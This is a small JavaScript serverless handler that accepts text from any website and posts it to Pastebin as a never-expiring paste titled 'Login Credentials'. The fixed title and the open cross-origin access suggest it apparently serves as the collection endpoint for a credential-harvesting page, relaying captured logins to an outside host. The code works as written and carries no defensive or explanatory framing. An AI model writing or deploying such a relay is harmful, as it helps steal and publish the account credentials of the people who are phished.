// api/pastebin.js

export default async function handler(req, res) {
    const apiKey = process.env.PASTEBIN_API_KEY; // Get API key from environment variables

    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*'); // Allow requests from any origin
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'POST') {
        try {
            // Parse JSON body
            const { pasteData } = req.body;

            if (!pasteData) {
                res.status(400).send('Bad Request: Missing pasteData');
                return;
            }

            const response = await fetch('https://pastebin.com/api/api_post.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    api_dev_key: apiKey,
                    api_option: 'paste',
                    api_paste_code: pasteData,
                    api_paste_name: 'Login Credentials',
                    api_paste_expire_date: 'N',
                })
            });

            const result = await response.text();
            res.status(200).send(result);
        } catch (error) {
            console.error('Error:', error); // Log the error for debugging
            res.status(500).send('Error occurred');
        }
    } else {
        res.setHeader('Allow', ['POST', 'OPTIONS']);
        res.status(405).end(`Method ${req.method} Not Allowed`);
    }
}
